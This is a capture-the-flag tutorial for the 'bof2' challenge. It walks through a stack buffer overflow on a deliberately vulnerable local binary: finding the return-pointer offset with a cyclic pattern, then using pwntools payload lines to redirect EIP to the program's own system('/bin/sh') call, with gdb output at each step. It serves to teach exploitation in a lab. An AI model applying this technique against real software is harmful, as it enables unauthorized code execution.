# bof2

This challenge is designed to show how to find and overwrite the return pointer on the stack. 
You may want to check out: [LiveOverflow](https://www.youtube.com/watch?v=8QzOC8HfOqU)

This challenge builds off of the previous one. The last challenge overwrote a variables' value on the stack. In this challenge we look into program flow and taking control of code execution.

The source for this challenge is very similar except that the passed parameter is defined in a global scope. This means that the comparison is not going to look on the stack for the variable value.

If we revisit my very crude depiction of the stack, we can see where the return pointer is. When a function is called the return pointer will get pushed to the stack and then stack memory will be allocated for that function to do what it needs with its local variables. 

```
-------------------------
 Lower Stack Addresses
-------------------------
0x1ac   overflowme       <---- The location we're writing to with gets()
...
0x1c8   end of overflowme
.
.
.
.
0x???   Return Pointer   <---- Return pointer back to main.
-------------------------
 Higher Stack Addresses
-------------------------
```

Steps to solve:
1) Overflow the buffer with easily identifiable input
2) Locate the offset of the return pointer
3) Find _where_ to redirect code execution
4) Construct and send our input with the return pointer overwritten to the value found in #3
5) Profit

Time to look at an example.

## 1) Overflow the buffer with easily identifiable input
We will do this the same way as the previous challenge. The [step1.py](./step1.py) script is set up to execute and attach a debugger.

Relevant code in the script:
```python
  payload  = cyclic(100)
  r.sendline(payload)
```

## 2) Locate the offset of the return pointer
Execute [step1.py -d](./step1.py) to start the script with the debugger attached.

The debugger will start and automatically break upon entering into the `func()` function. Next type `continue` or `c` for short and press enter.

Continue pressing enter until you get to the following instruction, try to follow along what is actually happening along the way:
```asm
=> 0x8048570 <func+85>: ret 
```

It should look like this:
```asm
 [----------------------------------registers-----------------------------------]
EAX: 0x6 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf775b870 --> 0x0 
ESI: 0xf775a000 --> 0x1b1db0 
EDI: 0xf775a000 --> 0x1b1db0 
EBP: 0x6161616b ('kaaa')
ESP: 0xffe2f12c ("laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
EIP: 0x8048570 (<func+85>:      ret)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804856b <func+80>: add    esp,0x10
   0x804856e <func+83>: nop
   0x804856f <func+84>: leave  
=> 0x8048570 <func+85>: ret    
   0x8048571 <main>:    lea    ecx,[esp+0x4]
   0x8048575 <main+4>:  and    esp,0xfffffff0
   0x8048578 <main+7>:  push   DWORD PTR [ecx-0x4]
   0x804857b <main+10>: push   ebp
[------------------------------------stack-------------------------------------]
0000| 0xffe2f12c ("laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0004| 0xffe2f130 ("maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0008| 0xffe2f134 ("naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0012| 0xffe2f138 ("oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0016| 0xffe2f13c ("paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0020| 0xffe2f140 ("qaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0024| 0xffe2f144 ("raaasaaataaauaaavaaawaaaxaaayaaa")
0028| 0xffe2f148 ("saaataaauaaavaaawaaaxaaayaaa")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
```
The [`ret`](http://c9x.me/x86/html/file_module_x86_id_280.html) instruction will take the next value off the stack and load that into the EIP register (Instruction pointer) and then code execution will continue from there. In the case above, the program will try to execute code at 0x6161616c (this is the hex representation of 'laaa').
If you type `next` and enter, you should see this:
```asm 
 [----------------------------------registers-----------------------------------]
EAX: 0x6 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf775b870 --> 0x0 
ESI: 0xf775a000 --> 0x1b1db0 
EDI: 0xf775a000 --> 0x1b1db0 
EBP: 0x6161616b ('kaaa')
ESP: 0xffe2f130 ("maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
EIP: 0x6161616c ('laaa')
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x6161616c
[------------------------------------stack-------------------------------------]
0000| 0xffe2f130 ("maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0004| 0xffe2f134 ("naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0008| 0xffe2f138 ("oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0012| 0xffe2f13c ("paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0016| 0xffe2f140 ("qaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0020| 0xffe2f144 ("raaasaaataaauaaavaaawaaaxaaayaaa")
0024| 0xffe2f148 ("saaataaauaaavaaawaaaxaaayaaa")
0028| 0xffe2f14c ("taaauaaavaaawaaaxaaayaaa")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$
```
Specifically we are interested in `EIP: 0x6161616c ('laaa')`. This means that we know exactly what offset into our buffer we need to change. We can manually count exactly how many characters were before the `laaa`, but who has time for that? Pwntools to the rescue, we can use the commandline functionality to do the search:
```bash
$ pwn cyclic -l 'laaa'
44
```

So we need to provide 44 characters (they will get ignored) and then have to give the address of code we want to execute. For now, lets make sure we have this part correct and send something easily identifiable. I like using `AAAA` because it's `0x41414141`. 

Change the lines in the script to:
```python
  wait_for_prompt(r)
  payload  = 'a'*44
  payload += 'AAAA' 
  r.sendline(payload)
```
The change has been made in [step2.py](./step2.py). Now execute it with [step2.py -d](./step2.py) and the debugger should break right before the `ret` instruction. If you type `next` and then enter, you should see:
```asm
 [----------------------------------registers-----------------------------------]
EAX: 0x6 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf7740870 --> 0x0 
ESI: 0xf773f000 --> 0x1b1db0 
EDI: 0xf773f000 --> 0x1b1db0 
EBP: 0x61616161 ('aaaa')
ESP: 0xffe9dc10 --> 0xf773f300 --> 0xf76e8267 (dec    ecx)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
```
Yay, congratulations. You have EIP control. But what do you do with it?

## 3) Find _where_ to redirect code execution
So now how do you know where to direct code execution to? This is where you'll need to get better at reading assembly and understanding what is happening. For this challenge I'll highlight where to jump to and why. From the [source code](./bof2.c) we know there is a call to `system("/bin/sh");`. This is what we want to execute. We know it's in the `func()` function. So lets disassemble that function in gdb:
```asm
gdb-peda$ disassemble func
Dump of assembler code for function func:
   0x0804851b <+0>:     push   ebp
   0x0804851c <+1>:     mov    ebp,esp
   0x0804851e <+3>:     sub    esp,0x28
   0x08048521 <+6>:     sub    esp,0xc
   0x08048524 <+9>:     push   0x8048640
   0x08048529 <+14>:    call   0x80483b0 <printf@plt>
   0x0804852e <+19>:    add    esp,0x10
   0x08048531 <+22>:    sub    esp,0xc
   0x08048534 <+25>:    lea    eax,[ebp-0x28]
   0x08048537 <+28>:    push   eax
   0x08048538 <+29>:    call   0x80483c0 <gets@plt>
   0x0804853d <+34>:    add    esp,0x10
   0x08048540 <+37>:    mov    eax,ds:0x804a02c
   0x08048545 <+42>:    cmp    eax,0xcafebabe
   0x0804854a <+47>:    jne    0x804855e <func+67>
   0x0804854c <+49>:    sub    esp,0xc
   0x0804854f <+52>:    push   0x804864f
   0x08048554 <+57>:    call   0x80483e0 <system@plt>
   0x08048559 <+62>:    add    esp,0x10
   0x0804855c <+65>:    jmp    0x804856e <func+83>
   0x0804855e <+67>:    sub    esp,0xc
   0x08048561 <+70>:    push   0x8048657
   0x08048566 <+75>:    call   0x80483d0 <puts@plt>
   0x0804856b <+80>:    add    esp,0x10
   0x0804856e <+83>:    nop
   0x0804856f <+84>:    leave  
   0x08048570 <+85>:    ret    
End of assembler dump.
```
See the line `0x08048554 <+57>:    call   0x80483e0 <system@plt>`? That's the `system()` call. But just jumping to this location won't solve the challenge. Feel free to experiment with this if you wish.

The problem is that `system()` has to be passed an argument. In our case we want to pass it `"/bin/sh"`. Arguments are passed to functions by pushing the parameter to the stack prior to the call. So lets look at the line above the call to `system` 
```asm
0x0804854f <+52>:    push   0x804864f
0x08048554 <+57>:    call   0x80483e0 <system@plt>
```
This pushes a value to the stack right before the call is made to `system`. We can inspect the memory at that location:
```asm
gdb-peda$ telescope 0x804864f
0000| 0x804864f ("/bin/sh")
0004| 0x8048653 --> 0x68732f ('/sh')
0008| 0x8048657 ("Nah..")
0012| 0x804865b --> 0x2e ('.')
0016| 0x804865f --> 0x31b0100 
0020| 0x8048663 --> 0x303b (';0')
0024| 0x8048667 --> 0x500 
0028| 0x804866b --> 0xfffd4000 
```
We can see that the address `0x804864f` holds the string `"/bin/sh"`. So we want to jump to `0x0804854f` since it will set up the stack exactly how we need it (pushing the pointer to the string, and then calling system).

## 4) Construct and send our input 
Change the lines in the script to:
```python
  wait_for_prompt(r)
  payload  = 'a'*44
  payload += p32(0x0804854f)     # pwntools provides an easy p32() function to not have to worry about endianess
  r.sendline(payload)
```
The change has been made in [step3.py](./step3.py). Now execute it with [step3.py -d](./step3.py) and the debugger should break right before the `ret` instruction. If you type `next` and then enter, you should see:
```asm
 [----------------------------------registers-----------------------------------]
EAX: 0x6 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf7739870 --> 0x0 
ESI: 0xf7738000 --> 0x1b1db0 
EDI: 0xf7738000 --> 0x1b1db0 
EBP: 0x61616161 ('aaaa')
ESP: 0xffb43a50 --> 0xf7738300 --> 0xf76e1267 (dec    ecx)
EIP: 0x804854f (<func+52>:      push   0x804864f)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048545 <func+42>: cmp    eax,0xcafebabe
   0x804854a <func+47>: jne    0x804855e <func+67>
   0x804854c <func+49>: sub    esp,0xc
=> 0x804854f <func+52>: push   0x804864f
   0x8048554 <func+57>: call   0x80483e0 <system@plt>
   0x8048559 <func+62>: add    esp,0x10
   0x804855c <func+65>: jmp    0x804856e <func+83>
   0x804855e <func+67>: sub    esp,0xc
[------------------------------------stack-------------------------------------]
0000| 0xffb43a50 --> 0xf7738300 --> 0xf76e1267 (dec    ecx)
0004| 0xffb43a54 --> 0xffb43a70 --> 0x1 
0008| 0xffb43a58 --> 0x0 
0012| 0xffb43a5c --> 0xf759e637 (<__libc_start_main+247>:       add    esp,0x10)
0016| 0xffb43a60 --> 0xf7738000 --> 0x1b1db0 
0020| 0xffb43a64 --> 0xf7738000 --> 0x1b1db0 
0024| 0xffb43a68 --> 0x0 
0028| 0xffb43a6c --> 0xf759e637 (<__libc_start_main+247>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
```
Yay, it's executing exactly what we want it to. Do you feel the power?

## 5) Profit
Now exit the debugger and run the script without the debugger attached:

$ [step3.py](./step3.py)
You should get an interactive shell. EG:
```
$ ./step3.py 
[+] Starting local process './bof2': pid 27114
overflow me :
[*] Switching to interactive mode
 Nah..
 $ ls
bof2  bof2.c  flag  README.md  runit.sh  step1.py  step2.py  step3.py
$ cat flag
flag{test_flag_for_chall}
$ 
```

Hopefully that made sense, and you feel more comfortable with buffer overflows now.
